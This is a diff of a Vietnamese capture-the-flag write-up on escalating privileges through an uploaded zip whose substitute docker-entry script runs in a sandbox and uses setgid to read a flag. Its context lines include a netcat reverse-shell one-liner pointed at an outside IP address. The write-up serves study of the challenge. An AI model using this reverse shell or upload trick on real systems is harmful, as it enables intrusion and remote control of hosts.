@@ -43,7 +43,8 @@
 - Tới đây lại khó khăn, tôi bắt đầu nghĩ đến khái niệm leo thang đặc quyền mà tôi hay nghe thấy, bắt đầu search và học và thử khá nhiều cách và tạch cuối cùng cũng tìm ra cách để giải bài này
 - Tôi tìm thầy file này trong source leak ra và nó xử lí file docker-entry 
 ![image](https://user-images.githubusercontent.com/82523299/188442154-b0e91ad7-80b2-496c-bcdb-36cb0867038c.png)
-
+- Nếu bạn cung cấp `docker-entry` thay vì tệp `./run` thì chương trình sẽ chạy `docker-entry` bên trong `sandbox`
+- Vậy bạn có thể tạo file với permission là `uploaded` bên trong file zip đã tải lên
 -File docker-entry2
 ```
 #!/usr/bin/bash
@@ -67,6 +68,7 @@ cat /tmp/f|sh -i 2>&1|nc 113.119.181.211 1000 >/tmp/f
 ```
 - Nén 3 file trên vào zip rồi up lên sau đó nc ngồi đợi server
 - Đổi tên file docker-entry2  thành docker-entry, để server thực thi docker-entry sau đó sẽ gán quyền egid=1000 cho file thực thi flag
+- Trong linux `setuid` và `setgid` chạy chương trình với sự cho phép của user sở hữu chương trình đó. Cho nên script `flag` có thể cat `flag2`.
 - Cuối cùng là ./flag và có flag.
 - 
 ![image](https://user-images.githubusercontent.com/82523299/188469974-a4c53d99-5f8d-4ea7-8eb8-ef6a55677d72.png)
